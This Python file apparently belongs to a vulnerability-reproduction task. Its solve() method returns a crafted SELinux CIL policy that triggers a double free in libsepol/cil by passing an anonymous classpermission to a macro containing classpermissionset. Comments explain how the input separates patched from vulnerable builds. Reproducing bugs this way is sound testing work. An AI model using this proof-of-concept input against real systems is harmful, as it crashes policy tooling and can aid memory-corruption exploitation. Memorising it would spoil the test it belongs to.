import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability exists in libsepol/cil when an anonymous classpermission 
        # is passed to a macro that uses a classpermissionset rule.
        # This causes a double free during AST destruction.
        # We wrap the call in an 'optional' block so that the fixed version 
        # (which returns an error for this invalid construct) can handle it 
        # gracefully and exit with code 0, while the vulnerable version crashes.
        
        poc = (
            "(class c (p))"
            "(classorder (c))"
            "(sid kernel)"
            "(sid security)"
            "(sid unlabeled)"
            "(sidorder (kernel security unlabeled))"
            "(user u)"
            "(role r)"
            "(type t)"
            "(sensitivity s)"
            "(sensitivityorder (s))"
            "(level l (s))"
            "(mls true)"
            "(context x (u r t l))"
            "(sidcontext kernel x)"
            "(sidcontext security x)"
            "(sidcontext unlabeled x)"
            "(macro m ((classpermission n))"
            "(classpermissionset n (c (p)))"
            ")"
            "(optional o "
            "(call m ((c (p))))"
            ")"
        )
        return poc.encode('utf-8')